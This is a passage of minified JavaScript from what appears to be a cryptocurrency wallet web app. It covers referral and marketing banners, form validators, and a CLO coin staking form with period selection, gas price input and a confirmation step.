                e.stopPropagation();
                t(closeReferralBanner())
            }
              , goToReferralPage = () => {
                e.push("/app/settings/referral-program")
            }
            ;
            return r ? O.createElement(BannerView_BannerView, {
                title: a,
                content: n,
                handleGoToLink: goToReferralPage,
                handleCloseBanner,
                BannerLogo: u$
            }) : null
        }
          , d$ = "@marketing-banner"
          , m$ = "marketing-banner"
          , p$ = "@marketing-banner.SET_CLEAR_STORE.commit"
          , f$ = "@marketing-banner.FETCH_BANNER_INFO"
          , E$ = "@marketing-banner.SET_BANNER_INFO.commit"
          , h$ = "@marketing-banner.SET_HIDDEN_BANNER_VERSION.commit"
          , g$ = "@marketing-banner.SET_FETCH_ERROR.commit"
          , y$ = {
            setClearStore: (0,
            te.createAction)(p$)(),
            fetchBannerInfo: (0,
            te.createAction)(f$)(),
            setBannerInfo: (0,
            te.createAction)(E$)(),
            setHiddenBannerVersion: (0,
            te.createAction)(h$)(),
            setFetchError: (0,
            te.createAction)(g$)()
        }
          , marketing_banner_selector_marketingBannerStateSelector = e => e["marketing-banner"]
          , v$ = (0,
        _t.P1)(marketing_banner_selector_marketingBannerStateSelector, (e => e.bannerInfo))
          , _$ = (0,
        _t.P1)(marketing_banner_selector_marketingBannerStateSelector, (e => e.hiddenVersion))
          , useMarketingBannerInfo = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(v$)
              , a = (0,
            $.v9)(_$)
              , n = (0,
            $.v9)(Bo)
              , [r,l] = (0,
            O.useState)(!1)
              , {version: s, bannerTitle: i, bannerContent: o, link: c, bannerSVG: u, show: d} = t
              , m = (0,
            O.useMemo)(( () => {
                if (u) {
                    const e = new Blob([u],{
                        type: "image/svg+xml"
                    });
                    return URL.createObjectURL(e)
                }
            }
            ), [u])
              , p = (0,
            O.useMemo)(( () => !a || a !== s), [a, s]);
            (0,
            O.useEffect)((function fetchBannerInformation() {
                !0 !== n && e(y$.fetchBannerInfo())
            }
            ), [e, n]);
            (0,
            O.useEffect)((function updateIsVisible() {
                return i && o && c && m && p && d ? l(!0) : r ? l(!1) : void 0
            }
            ), [o, m, i, p, c, d]);
            return {
                bannerTitle: i || "",
                bannerContent: o || "",
                link: c || "",
                bannerLogoUrl: m || "",
                version: s || "",
                isVisible: r
            }
        }
          , MarketingBanner = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)()
              , {bannerTitle: a, bannerContent: n, bannerLogoUrl: r, link: l, version: s, isVisible: i} = useMarketingBannerInfo()
              , goToLink = () => {
                if (l && l.includes("/app")) {
                    const e = l.split("/app")[1];
                    t.push(`${(0,
                    M.RU)()}${e}`)
                } else
                    l && window.open(l)
            }
              , handleCloseBanner = () => {
                s && e(y$.setHiddenBannerVersion({
                    version: s
                }))
            }
            ;
            return i ? O.createElement(BannerView_BannerView, {
                title: a,
                content: n,
                link: l,
                handleGoToLink: goToLink,
                BannerLogo: r,
                handleCloseBanner
            }) : null
        }
          , w$ = "banners_container_1sn_2"
          , b$ = "banners_item_2mSg8"
          , Banners_Banners = () => {
            const {isVisible: e} = useMarketingBannerInfo()
              , {isVisible: t} = useReferralBannerInfo()
              , a = undefined;
            return (0,
            O.useMemo)(( () => e || t), [e, t]) ? O.createElement("div", {
                className: w$
            }, O.createElement("div", {
                className: b$
            }, O.createElement(ReferralBanner, null)), O.createElement("div", {
                className: b$
            }, O.createElement(MarketingBanner, null))) : null
        }
        ;
        function ResetEosAccountCreationState() {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)();
            (0,
            O.useEffect)(( () => {
                async function remove() {
                    await e(setSecureData(qe, null));
                    t.replace({
                        pathname: (0,
                        M.RU)()
                    })
                }
                remove()
            }
            ), []);
            return O.createElement("div", null)
        }
        const k$ = {
            wrapper: "StakingClo_wrapper_15ckI app_wrapperBlock_2EpA3",
            wrapperForm: "StakingClo_wrapperForm_1q7r2 app_wrapperLeftBlock_3QLZp",
            footerBlock: "StakingClo_footerBlock_13_XU app_footerBlock_n86Kc",
            stepInfo: "StakingClo_stepInfo_1nsHk app_stepInfo_2VLE6",
            toggleAdvancedOptions: "StakingClo_toggleAdvancedOptions_MY8HC",
            item: "StakingClo_item_3UE3p",
            roundBlock: "StakingClo_roundBlock_2QyxJ"
        }
          , S$ = [{
            period: 1,
            description: "(27 days)"
        }, {
            period: 2,
            description: "(54 days)"
        }, {
            period: 3,
            description: "(81 days)"
        }, {
            period: 4,
            description: "(108 days)"
        }, {
            period: 5,
            description: "(135 days)"
        }, {
            period: 6,
            description: "(162 days)"
        }, {
            period: 7,
            description: "(189 days)"
        }, {
            period: 8,
            description: "(216 days)"
        }, {
            period: 9,
            description: "(243 days)"
        }, {
            period: 10,
            description: "(270 days)"
        }, {
            period: 11,
            description: "(297 days)"
        }, {
            period: 12,
            description: "(324 days)"
        }];
        var C$ = a(42283)
          , N$ = a(35434)
          , T$ = a(99025)
          , A$ = a(51618)
          , x$ = a(21022)
          , I$ = a(75016)
          , P$ = a(94623);
        function IsGreaterThan(e, t) {
            return (a, n) => {
                (0,
                P$.e)({
                    name: "isGreaterThan",
                    target: a.constructor,
                    propertyName: n,
                    options: t,
                    constraints: [e],
                    validator: {
                        validate(e, t) {
                            const a = t.constraints[0]
                              , n = a in t.object ? t.object[a] : null;
                            return !!n && (0,
                            Ko.gt)(e, n)
                        },
                        defaultMessage(e) {
                            const [t] = e.constraints
                              , {targetName: a} = e;
                            return `The ${a} should be greater than ${t}`
                        }
                    }
                })
            }
        }
        var L$ = a(4869);
        function IsRoundedTo(e, t) {
            return (a, n) => {
                (0,
                P$.e)({
                    name: "isRoundedTo",
                    target: a.constructor,
                    propertyName: n,
                    options: t,
                    constraints: [e],
                    validator: {
                        validate(e, t) {
                            const [a] = t.constraints;
                            return !e || !a || new (Sc())(e).dp() <= a
                        },
                        defaultMessage(e) {
                            const [t] = e.constraints;
                            return "0" === t ? "Round up the amount. Only integers allowed." : `Reduce the number (max ${t} decimals)`
                        }
                    }
                })
            }
        }
        function BnMax(e, t) {
            return (a, n) => {
                (0,
                P$.e)({
                    name: "bnMax",
                    target: a.constructor,
                    propertyName: n,
                    options: t,
                    constraints: [e],
                    validator: {
                        validate(e, t) {
                            const [a] = t.constraints;
                            return !a || (0,
                            Ko.G)(a, 0) || (0,
                            Ko.G)(e, a)
                        },
                        defaultMessage(e) {
                            const [t] = e.constraints;
                            return `The value must be smaller ${t}`
                        }
                    }
                })
            }
        }
        function BnMin(e, t) {
            return (a, n) => {
                (0,
                P$.e)({
                    name: "bnMin",
                    target: a.constructor,
                    propertyName: n,
                    options: t,
                    constraints: [e],
                    validator: {
                        validate(e, t) {
                            const [a] = t.constraints;
                            return (0,
                            Ko.lt)(e, 0) || (0,
                            Ko.lt)(a, 0) || (0,
                            Ko.eg)(e, a) && (0,
                            Ko.gt)(e, 0)
                        },
                        defaultMessage(e) {
                            const [t] = e.constraints
                              , {value: a} = e;
                            return (0,
                            Ko.G)(a, 0) ? `The value must be greater than ${a}` : `The value must be greater than ${t}`
                        }
                    }
                })
            }
        }
        var F$ = a(81960), W$, R$, B$, O$, D$, M$, U$, G$, V$, K$, H$, z$, j$, $$, Z$, Y$;
        function _initializerDefineProperty(e, t, a, n) {
            a && Object.defineProperty(e, t, {
                enumerable: a.enumerable,
                configurable: a.configurable,
                writable: a.writable,
                value: a.initializer ? a.initializer.call(n) : void 0
            })
        }
        function staking_clo_validator_defineProperty(e, t, a) {
            (t = staking_clo_validator_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function staking_clo_validator_toPropertyKey(e) {
            var t = staking_clo_validator_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function staking_clo_validator_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        function _applyDecoratedDescriptor(e, t, a, n, r) {
            var l = {};
            Object.keys(n).forEach((function(e) {
                l[e] = n[e]
            }
            ));
            l.enumerable = !!l.enumerable;
            l.configurable = !!l.configurable;
            ("value"in l || l.initializer) && (l.writable = !0);
            l = a.slice().reverse().reduce((function(a, n) {
                return n(e, t, a) || a
            }
            ), l);
            if (r && void 0 !== l.initializer) {
                l.value = l.initializer ? l.initializer.call(r) : void 0;
                l.initializer = void 0
            }
            if (void 0 === l.initializer) {
                Object.defineProperty(e, t, l);
                l = null
            }
            return l
        }
        function _initializerWarningHelper(e, t) {
            throw new Error("Decorating class property failed. Please ensure that proposal-class-properties is enabled and runs after the decorators transform.")
        }
        let q$ = (W$ = (0,
        N$.U)(),
        R$ = (0,
        L$.D)(( () => Number)),
        B$ = (0,
        T$.rl)(),
        O$ = (0,
        L$.D)(( () => String)),
        M$ = _applyDecoratedDescriptor((D$ = class Wallet {
            constructor() {
                _initializerDefineProperty(this, "balance", M$, this);
                _initializerDefineProperty(this, "address", U$, this)
            }
        }
        ).prototype, "balance", [W$, R$], {
            configurable: !0,
            enumerable: !0,
            writable: !0,
            initializer: null
        }),
        U$ = _applyDecoratedDescriptor(D$.prototype, "address", [B$, O$], {
            configurable: !0,
            enumerable: !0,
            writable: !0,
            initializer: null
        }),
        D$);
        const stakeClassValidatorResolver = e => {
            var t, a, n, r, l, s, i, o, c, u, d, m, p, f, E, h;
            let {balance: g} = e;
            const y = 18
              , v = "0"
              , _ = (0,
            Ko.FH)(null != g ? g : 0, {
                max: 18
            })
              , w = null != g ? g : 0;
            let b = (t = (0,
            A$.$i)({
                message: "No wallet selected"
            }),
            a = (0,
            x$.p9)(),
            n = (0,
            I$.j)(),
            r = (0,
            L$.D)(( () => q$)),
            l = (0,
            L$.D)(( () => q$)),
            s = IsRoundedTo(y),
            i = BnMax(w, {
                message: "Insufficient funds"
            }),
            o = BnMax(_),
            c = BnMin(v),
            u = (0,
            L$.D)(( () => String)),
            d = (0,
            A$.$i)({
                message: "No period selected"
            }),
            p = _applyDecoratedDescriptor((m = class StakeDTO {
                constructor() {
                    _initializerDefineProperty(this, "fromWallet", p, this);
                    _initializerDefineProperty(this, "toWallet", f, this);
                    _initializerDefineProperty(this, "amount", E, this);
                    _initializerDefineProperty(this, "rounds", h, this);
                    staking_clo_validator_defineProperty(this, "gasLimit", void 0);
                    staking_clo_validator_defineProperty(this, "gasPrice", void 0);
                    staking_clo_validator_defineProperty(this, "fee", void 0)
                }
            }
            ).prototype, "fromWallet", [t, a, n, r], {
                configurable: !0,
                enumerable: !0,
                writable: !0,
                initializer: null
            }),
            f = _applyDecoratedDescriptor(m.prototype, "toWallet", [l], {
                configurable: !0,
                enumerable: !0,
                writable: !0,
                initializer: null
            }),
            E = _applyDecoratedDescriptor(m.prototype, "amount", [s, i, o, c, u], {
                configurable: !0,
                enumerable: !0,
                writable: !0,
                initializer: null
            }),
            h = _applyDecoratedDescriptor(m.prototype, "rounds", [d], {
                configurable: !0,
                enumerable: !0,
                writable: !0,
                initializer: null
            }),
            m);
            return (0,
            F$.L)(b, {
                stopAtFirstError: !0
            }, {
                mode: "async"
            })
        }
        ;
        let X$ = (G$ = (0,
        T$.rl)(),
        V$ = (0,
        T$.rl)(),
        K$ = IsGreaterThan("fee", {
            message: "Claiming is a transaction that requires paying a transaction fee. It seems that currently you have not enough funds to perform claiming.",
            context: {
                type: ww.error
            }
        }),
        H$ = IsGreaterThan("fee", {
            message: "Your reward amount is less than the fee amount.",
            context: {
                type: ww.warning
            }
        }),
        j$ = _applyDecoratedDescriptor((z$ = class RewardDTO {
            constructor() {
                _initializerDefineProperty(this, "address", j$, this);
                _initializerDefineProperty(this, "privateKey", $$, this);
                staking_clo_validator_defineProperty(this, "fee", void 0);
                _initializerDefineProperty(this, "balance", Z$, this);
                _initializerDefineProperty(this, "reward", Y$, this)
            }
        }
        ).prototype, "address", [G$], {
            configurable: !0,
            enumerable: !0,
            writable: !0,
            initializer: null
        }),
        $$ = _applyDecoratedDescriptor(z$.prototype, "privateKey", [V$], {
            configurable: !0,
            enumerable: !0,
            writable: !0,
            initializer: null
        }),
        Z$ = _applyDecoratedDescriptor(z$.prototype, "balance", [K$], {
            configurable: !0,
            enumerable: !0,
            writable: !0,
            initializer: null
        }),
        Y$ = _applyDecoratedDescriptor(z$.prototype, "reward", [H$], {
            configurable: !0,
            enumerable: !0,
            writable: !0,
            initializer: null
        }),
        z$);
        const Q$ = O.memo((e => {
            let {children: t} = e;
            const [a,n] = O.useState(!1)
              , r = O.useCallback((e => () => n(e)), [])
              , l = O.useMemo(( () => a ? "Hide advanced options" : "Advanced options"), [a]);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: k$.toggleAdvancedOptions
            }, O.createElement("span", {
                role: "link",
                tabIndex: 0,
                onClick: r(!a),
                className: "dashedNormal"
            }, l)), a && t)
        }
        ));
        function getTxSpeed(e, t) {
            return e < t / 2 ? "slow" : e > t / 2 && e < t ? "probably slow" : e === t ? "maybe fast" : e < 2 * t && e > t ? "fast" : e >= 2 * t ? "Very fast" : ""
        }
        async function fetchGasPrice(e) {
            var t;
            const a = await Se.Z.getApiByWallet(e);
            return null == a || null === (t = a.getGasPrice) || void 0 === t ? void 0 : t.call(a)
        }
        const J$ = O.forwardRef(( (e, t) => {
            let {wallet: a, value: n, onChange: r} = e;
            const [l,s] = (0,
            O.useState)(null)
              , [i,o] = (0,
            O.useState)(!1)
              , c = (0,
            O.useMemo)(( () => l ? Math.max(1.5 * l, 99) : 99), [l])
              , u = (0,
            O.useMemo)(( () => l && n ? getTxSpeed(n, l) : ""), [l, n]);
            (0,
            O.useEffect)(( () => {
                let e = !1;
                a && (async () => {
                    const t = await fetchGasPrice(a);
                    if (!e) {
                        s(t);
                        o(!0);
                        n || r(t)
                    }
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), [a, a.uuid]);
            const d = O.useCallback(( () => {
                l && r(l);
                o(!0)
            }
            ), [l, r])
              , m = O.useCallback((e => {
                let {currentTarget: {value: t}} = e;
                return r(t)
            }
            ), [r]);
            return O.createElement("div", {
                className: JO,
                ref: t
            }, O.createElement(Ea, {
                value: n || "",
                min: 1,
                max: c,
                onChange: m
            }), !n && !i && O.createElement("div", {
                className: rD
            }, O.createElement(LoaderDots, {
                visible: !0
            })), u && O.createElement("div", {
                className: lD
            }, "Tx speed: ", u), O.createElement("span", {
                className: nD
            }, "Default Gas Price ", O.createElement("b", {
                onClick: d
            }, l), " GWei"))
        }
        ));
        J$.displayName = "InputGasPrice";
        const eZ = J$
          , tZ = O.forwardRef(( (e, t) => {
            const {renderItem: a, isVisible: n, setVisible: r, handleClose: l} = useRenderWallets(e)
              , {isNoBorder: s, isBoxSizing: i, isNewStyles: o} = e
              , c = e.isLoading || e.disabled;
            return O.createElement("div", {
                ref: t,
                className: Jl.wrapper,
                tabIndex: 0,
                role: "button"
            }, O.createElement("div", {
                role: "button",
                tabIndex: 0,
                className: Ht()(Jl.inputWrapper, {
                    [Jl.placeholder]: !e.value,
                    [Jl.isOpen]: n,
                    [Jl.isNoBorder]: s,
                    [Jl.isInactive]: c,
                    [Jl.isBoxSizing]: i
                }, e.inputWrapperClassName),
                onClick: () => r(!n)
            }, !e.isLoading && e.value && a(e.value, "select"), !e.isLoading && !e.value && O.createElement("span", null, e.placeholder ? e.placeholder : "Select wallet"), e.isLoading && O.createElement("div", {
                className: Jl.walletsLoader
            }, O.createElement(LoaderDots, {
                visible: !0
            })), !0 !== e.disabled && O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: e.newArrow ? dh() : Gd()
                },
                className: Ht()(Jl.iconArrow, {
                    [Jl.newIconArrow]: e.newArrow
                })
            })), !0 !== e.disabled && O.createElement(Xl(), {
                visible: n,
                onClose: l
            }, O.createElement("div", {
                role: "button",
                tabIndex: 0,
                className: Ht()(Jl.wrapperList, o && Jl.newWrapperList),
                onClick: l
            }, O.createElement(InputWalletsList, e))))
        }
        ));
        tZ.displayName = "SelectWallet";
        const aZ = tZ;
        function Button_extends() {
            Button_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return Button_extends.apply(this, arguments)
        }
        const nZ = O.memo((e => {
            const {isLoading: t, className: a, children: n, color: r, size: l, radius: s, type: i, ...o} = e
              , c = (0,
            O.useMemo)(( () => {
                const e = [Zl.button];
                r && e.push(Zl[r]);
                l && e.push(Zl[l]);
                s && e.push(Zl[`radius-${s}`]);
                return e
            }
            ), [r, s, l]);
            return O.createElement("button", Button_extends({
                className: Ht()(...c, a, {
                    [Zl.isLoadingButton]: t
                })
            }, o, {
                type: "submit" === i ? "submit" : "button"
            }), t ? O.createElement(loader, {
                visible: !0,
                white: "light-blue" !== r,
                width: 24,
                className: Zl.loader
            }) : n)
        }
        ))
          , rZ = nZ;
        function selector_checkStr(e, t) {
            return null !== String(e).match(t)
        }
        const Selector = e => {
            const {items: t, selected: a, onChange: n, placeholder: r, emptyPlaceholder: l} = e
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)("");
            function handleSelect(e) {
                return function open() {
                    n(e);
                    i(!1);
                    c("")
                }
            }
            function handleOpen() {
                c("");
                i(!s)
            }
            const handleSearch = e => {
                let {target: {value: t}} = e;
                return c(t)
            }
              , getJSXWithItem = e => O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(vp, k$.item)
            }, O.createElement("span", null, e.period), O.createElement("div", null, e.description)))
              , u = {
                [yp]: !a,
                [gp]: s
            }
              , d = new RegExp(escape_search(o),"ig")
              , m = t.filter((e => !o || selector_checkStr(String(e.period), d)))
              , enterHandler = e => {
                if (e && e.dataset && e.dataset.period) {
                    const t = S$.find((t => {
                        var a;
                        return (null == e || null === (a = e.dataset) || void 0 === a ? void 0 : a.period) === String(t.period)
                    }
                    ));
                    t ? handleSelect(t)() : handleSelect(S$[0])()
                } else
                    handleSelect(S$[0])()
            }
              , {arrowNavigation: p, listRef: f} = es({
                enterHandler
            });
            return O.createElement("div", {
                className: Ep,
                tabIndex: 0,
                role: "button"
            }, O.createElement("div", {
                className: Ht()(hp, u),
                onClick: handleOpen
            }, a ? getJSXWithItem(a) : O.createElement("span", null, r), O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Gd()
                },
                className: _p
            })), O.createElement(Xl(), {
                visible: s,
                onClose: () => i(!1)
            }, O.createElement("div", {
                className: wp
            }, O.createElement("div", {
                role: "button",
                tabIndex: 0,
                onKeyDown: p,
                className: Ap
            }, O.createElement("input", {
                onChange: handleSearch,
                placeholder: "Search period",
                type: "text",
                autoFocus: !0,
                className: xp,
                spellCheck: "false",
                autoCorrect: "off",
                autoComplete: "off"
            })), O.createElement("div", {
                ref: f
            }, m.map((e => O.createElement("div", {
                className: Ht()(bp, k$.roundBlock),
                onClick: handleSelect(e),
                "data-period": e.period,
                key: `select-item${e.period}`
            }, getJSXWithItem(e)))), !m.length && O.createElement("div", {
                className: kp
            }, l)))))
        }
          , lZ = O.forwardRef(( (e, t) => {
            const {roundsList: a, onChange: n, value: r} = e;
            return O.createElement("div", {
                ref: t,
                className: Jl.wrapper,
                tabIndex: 0,
                role: "button"
            }, O.createElement(Selector, {
                selected: null != r ? r : a[0],
                items: a,
                placeholder: "Select period",
                onChange: n,
                emptyPlaceholder: "Choose between 1 to 12 rounds"
            }))
        }
        ));
        lZ.displayName = "SelectRounds";
        const sZ = lZ;
        function StakingCloForm_extends() {
            StakingCloForm_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return StakingCloForm_extends.apply(this, arguments)
        }
        const resolver = (e, t, a) => {
            const {balance: n=0} = e.fromWallet || {};
            return stakeClassValidatorResolver({
                balance: n
            })(e, t, a)
        }
          , iZ = O.memo((e => {
            var t, a, n, r;
            const {wallets: l, fromWallet: s, amount: i, gasLimit: o, gasPrice: c, fee: u, isLoading: d, onUpdate: m, process: p, roundsList: f} = e
              , E = {
                fromWallet: s,
                amount: i,
                gasLimit: o,
                gasPrice: c,
                fee: u
            }
              , h = (0,
            O.useMemo)(( () => debounce(m, 200)), [m])
              , {formState: {errors: g}, handleSubmit: y, control: v, setValue: _, watch: w} = (0,
            C$.cI)({
                resolver,
                defaultValues: E
            })
              , b = (0,
            j.k6)()
              , {convertToFiat: k} = useConverter()
              , S = w("fee")
              , C = w("fromWallet")
              , N = w("amount")
              , T = w("gasPrice")
              , A = (0,
            Ko.lt)(C.balance, S)
              , x = Sc().max(0, new (Sc())(null === (t = null != C ? C : s) || void 0 === t ? void 0 : t.balance).minus(S || 0)).toString()
              , I = (0,
            O.useCallback)((e => {
                if (A)
                    return;
                const t = {
                    walletFrom: e.fromWallet.uuid,
                    amount: (0,
                    Ko.FH)(e.amount, {
                        max: 18
                    }),
                    rounds: e.rounds.period,
                    fee: S ? String(S) : ""
                };
                void 0 !== e.gasPrice && (t.gasPrice = e.gasPrice);
                const a = (0,
                Ko.FH)(k(e.amount, e.fromWallet, "usd"), {
                    max: 4
                });
                a && Object.assign(t, {
                    amountInUsd: a
                });
                b.push({
                    pathname: (0,
                    M.RU)("/staking-clo/staking/confirm"),
                    search: objectToString(t)
                })
            }
            ), [k, b, A, S, T]);
            (0,
            O.useEffect)(( () => {
                _("fromWallet", s);
                _("gasLimit", o);
                _("fee", u)
            }
            ), [o, u, _, s]);
            (0,
            O.useEffect)(( () => {
                h({
                    fromWallet: C,
                    amount: N,
                    additionalSend: {
                        gasPrice: T
                    }
                });
                return () => {
                    h.cancel()
                }
            }
            ), [h, N, C, T]);
            return O.createElement("form", {
                onSubmit: y(I)
            }, O.createElement(label, null, "Stake From"), O.createElement(pa, {
                isSelect: !0,
                isInvalid: !!g.fromWallet,
                message: null !== (a = g.fromWallet) && void 0 !== a && a.balance ? null === (n = g.fromWallet) || void 0 === n ? void 0 : n.balance.message : ""
            }, O.createElement(C$.Qr, {
                name: "fromWallet",
                control: v,
                render: e => {
                    let {field: t} = e;
                    return O.createElement(aZ, StakingCloForm_extends({
                        wallets: l,
                        withoutWatchOnly: !0
                    }, t))
                }
            })), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(pa, {
                isInvalid: !(null == g || !g.amount),
                message: null === (r = g.amount) || void 0 === r ? void 0 : r.message
            }, O.createElement(C$.Qr, {
                name: "amount",
                control: v,
                render: e => {
                    let {field: t} = e;
                    return O.createElement(Ea, StakingCloForm_extends({}, t, {
                        placeholder: "0"
                    }))
                }
            }))), O.createElement(label, null, "Select Period"), O.createElement(pa, {
                isSelect: !0,
                isInvalid: !!g.rounds,
                message: "Invalid round"
            }, O.createElement(C$.Qr, {
                name: "rounds",
                control: v,
                defaultValue: f[0],
                render: e => {
                    let {field: t} = e;
                    return O.createElement(sZ, StakingCloForm_extends({
                        roundsList: f
                    }, t))
                }
            })), O.createElement(AvailableForStaking, {
                currency: s.currency,
                maxAmount: x,
                setAmount: e => _("amount", e)
            }), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Network Fee:"), O.createElement(MiskInfoValue, {
                disabled: d || !S
            }, (0,
            Ko.yF)(null != S ? S : 0), " ", (0,
            be.xG)(s && (null == s ? void 0 : s.currency)))), O.createElement(Q$, null, O.createElement(label, null, "Gas Price"), O.createElement(C$.Qr, {
                name: "gasPrice",
                control: v,
                render: e => {
                    let {field: t} = e;
                    return O.createElement(eZ, StakingCloForm_extends({
                        wallet: s,
                        gasLimit: o
                    }, t))
                }
            })), A && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(s.currency), " Balance. The fee is paid from the wallet balance. Available balance: ", s.balance, " ", (0,
            be.xG)(s.currency)), O.createElement("div", {
                className: k$.footerBlock
            }, d ? O.createElement("div", {
                className: k$.stepInfo
            }, p && O.createElement("span", null, p)) : O.createElement("div", {
                className: k$.stepInfo
            }, "Step 1 of 3"), O.createElement(rZ, {
                color: "blue",
                size: "big",
                type: "submit",
                disabled: d,
                isLoading: d
            }, "Next")))
        }
        ));
        var oZ = a(29278)
          , cZ = a(45152);
        const getWalletsState = e => {
            var t;
            return null !== (t = (0,
            oe.zZ)(e)) && void 0 !== t ? t : []
        }
          , uZ = (0,
        _t.wN)(_t.PW, oZ.Z)
          , dZ = uZ(getWalletsState, (e => e))
          , mZ = uZ(dZ, (e => {
            var t, a;
            return null !== (t = null == e || null === (a = e.wallets) || void 0 === a ? void 0 : a.balances) && void 0 !== t ? t : {}
        }
        ), ( (e, t) => e.map((e => {
            var a;
            const n = e instanceof cZ.Z ? e.mapToPlainObject() : e
              , r = null !== (a = t[n.uuid]) && void 0 !== a ? a : n.balance;
            return n.balance !== r ? {
                ...n,
                balance: r
            } : n
        }
        ))))
          , pZ = uZ(( (e, t) => {
            let {currencies: a} = t;
            return a
        }
        ), (e => e))
          , fZ = uZ(mZ, pZ, ( (e, t) => Array.isArray(e) ? e.filter((e => {
            let {currency: a} = e;
            return t.includes(a)
        }
        )) : []))
          , EZ = uZ(( (e, t) => {
            let {uuid: a} = t;
            return a
        }
        ), (e => e))
          , hZ = uZ(mZ, EZ, ( (e, t) => {
            var a;
            if (Array.isArray(e) && t)
                return null !== (a = e.find((e => e.uuid === t))) && void 0 !== a ? a : void 0
        }
        ))
          , useInitParams = () => {
            const e = useLocationSearch()
              , t = (0,
            $.v9)((e => fZ(e, {
                currencies: ["clo"]
            })))
              , [a,n] = (0,
            O.useState)(null == e ? void 0 : e.walletFrom)
              , r = (0,
            $.v9)((e => hZ(e, {
                uuid: null != a ? a : ""
            })));
            (0,
            O.useEffect)(( () => {
                a !== (null == e ? void 0 : e.walletFrom) && n(null == e ? void 0 : e.walletFrom)
            }
            ), [a, null == e ? void 0 : e.walletFrom]);
            return {
                wallets: t,
                fromWallet: r,
                setFromWalletId: n
            }
        }
          , gZ = O.memo(( () => O.createElement(panel_right_image, {
            src: mD
        }, "Stake your coins right in the custody-free wallet. You will receive staking rewards every period, or every 27 days. You only will be able to withdraw your deposit when staking period is expired.")))
          , yZ = O.memo(( () => {
            var e;
            const t = (0,
            $.I0)()
              , a = useLocationSearch()
              , [n] = (0,
            O.useState)(null !== (e = null == a ? void 0 : a.amount) && void 0 !== e ? e : "")
              , {wallets: r, fromWallet: l} = useInitParams()
              , {gasPrice: s, gasLimit: i, fee: o, isPageDataFetching: c, process: u} = (0,
            $.v9)(stakingSelector)
              , d = (null == a ? void 0 : a.gasPrice) || s
              , m = (0,
            O.useCallback)((e => t(eb(e))), [t]);
            (0,
            O.useEffect)(( () => {
                l && (0,
                $.dC)(( () => {
                    t(Qw.visit({
                        fromWallet: l
                    }));
                    m({
                        fromWallet: l,
                        amount: n,
                        additionalSend: {
                            gasPrice: d
                        }
                    })
                }
                ));
                return () => {
                    t(Qw.exit({
                        fromWallet: l
                    }))
                }
            }
            ), [null == l ? void 0 : l.uuid]);
            return r.length && l ? O.createElement(sG, {
                wallet: l,
                styles: k$,
                RightBlockContent: gZ
            }, O.createElement(iZ, {
                wallets: r,
                roundsList: S$,
                amount: null != n ? n : "",
                fromWallet: l,
                gasPrice: d,
                gasLimit: i,
                fee: o,
                isLoading: c,
                onUpdate: m,
                process: u
            })) : null
        }
        ))
          , StakingCloConfirm = () => {
            var e, t, a, n;
            const r = (0,
            j.TH)()
              , l = (0,
            j.k6)()
              , s = useLocationSearch()
              , [i] = (0,
            O.useState)(null !== (e = null == s ? void 0 : s.amount) && void 0 !== e ? e : "")
              , [o] = (0,
            O.useState)(null !== (t = null == s ? void 0 : s.rounds) && void 0 !== t ? t : "")
              , [c] = (0,
            O.useState)(null !== (a = null == s ? void 0 : s.gasPrice) && void 0 !== a ? a : "")
              , [u] = (0,
            O.useState)(null !== (n = null == s ? void 0 : s.fee) && void 0 !== n ? n : "")
              , [d,m] = (0,
            O.useState)(!1)
              , {fromWallet: p} = useInitParams()
              , {isDataFetching: f, stakingTxResultHash: E, isStakingTxFetching: h, process: g, notifications: {staking: y}} = (0,
            $.v9)(stakingSelector)
              , v = (0,
            O.useMemo)(( () => y && "request"in y ? y.request : null), [y])
              , _ = (0,
            $.I0)()
              , w = O.useCallback((e => () => _(Iw({
                uuid: e
            }))), [_])
              , {convertToFiat: b} = useConverter()
              , {localCurrency: k} = local_currency_useLocalCurrency();
            (0,
            O.useEffect)(( () => {
                if (p && i && u) {
                    const e = (0,
                    Ko.gt)(i, (0,
                    Ko.h9)(p.balance, u));
                    m(!!e)
                }
            }
            ), [i, u, p]);
            (0,
            O.useEffect)(( () => {
                p && (0,
                $.dC)(( () => {
                    _(Qw.visit({
                        fromWallet: p
                    }));
                    w(null == p ? void 0 : p.uuid)();
                    _(eb({
                        fromWallet: p,
                        amount: i
                    }))
                }
                ));
                return () => {
                    _(Qw.exit({
                        fromWallet: p
                    }))
                }
            }
            ), [i, _, p, w]);
            (0,
            O.useEffect)(( () => {
                E && l.replace({
                    pathname: (0,
                    M.RU)("/send/success"),
                    search: objectToString({
                        hash: E,
                        walletFrom: null == p ? void 0 : p.uuid,
                        currency: null == p ? void 0 : p.currency,
                        type: "cloStakingTx",
                        amount: i
                    })
                })
            }
            ), [i, null == p ? void 0 : p.currency, null == p ? void 0 : p.uuid, l, E]);
            const handleBack = () => {
                l.replace({
                    pathname: (0,
                    M.RU)("/staking-clo/staking"),
                    search: r.search
